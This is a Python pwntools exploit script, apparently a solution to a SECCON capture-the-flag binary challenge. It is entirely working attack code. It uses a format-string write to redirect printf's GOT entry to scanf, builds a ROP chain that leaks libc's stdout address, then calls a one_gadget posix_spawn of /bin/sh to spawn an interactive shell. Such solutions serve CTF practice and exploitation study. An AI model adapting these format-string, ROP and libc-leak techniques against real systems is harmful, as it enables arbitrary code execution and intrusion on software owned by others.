#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall',checksec=False)
io = process()
libc = ELF('./libc.so.6')
#gdb.attach(io,gdbscript='''     

 #       b*0x00000000004011fa
  #      b*0x000000000040121D
    #       ''')

one_gadget = [0x583dc,0x583e3,0xef4ce,0xef52b]
log.info(f"one_gadget {hex(one_gadget[3])}")

writes = {    
    exe.got.printf: p64(exe.sym.__isoc99_scanf)   
}

payload = fmtstr_payload(6, writes, write_size='int')  # generate most 
payload = b'%4198560d%8$llna(@@\x00\x00\x00\x00'  # <-- same as pwntools but removed some null bytes
print(len(payload))
input()
io.sendlineafter(b'"What is your name?", the black cat asked.\n', payload)

p = b"A" * 40
p += p64(0x401281)  # 0x401281: pop rsi ; pop r15 ; ret ;
p += p64(0x404150)  # .bss
p += p64(0)
p += p64(0x401283)  # 0x401283: pop rdi ; ret ;
p += p64(0x403078)  # %s warmly.\n
p += p64(0x401060)  # scanf
p += p64(0x401283)  # 0x401283: pop rdi ; ret ;
p += p64(0x404050)  # 0x404050 <stdout@@GLIBC_2.2.5>:   0x00007d0f7ba045c0
p += p64(0x401030)  # puts

p += p64(0x401196) # main



io.sendline(
    b' answered, a bit confused.\n"Welcome to SECCON," the cat greeted '
    + p
    + b" warmly.\n\n"
)
io.sendline(b"/bin/sh #" + b" warmly.\n\n")

res = io.recvline()[-7:].strip()
print(res)
leakedlibc = u64(res.ljust(8, b"\x00"))
log.info(f"leaked libc: {hex(leakedlibc)}")

libc.address = leakedlibc - libc.sym["_IO_2_1_stdout_"]
log.info(f"libc base: {hex(libc.address)}")

p = b"A" * 40

"""
0x583e3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17302e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

"""
p += p64(libc.address + 0x10E243)  # pop rcx ; ret
p += p64(0)
p += p64(libc.address + 0x5ACE9)  # pop rbx ; ret
p += p64(0)
p += p64(libc.address + 0x583E3) # posix_spawn

io.recvuntil(b"asked.\n")
input("input")
io.sendline(
    b' answered, a bit confused.\n"Welcome to SECCON," the cat greeted '
    + p
    + b" warmly.\n\n"
)


io.interactive()
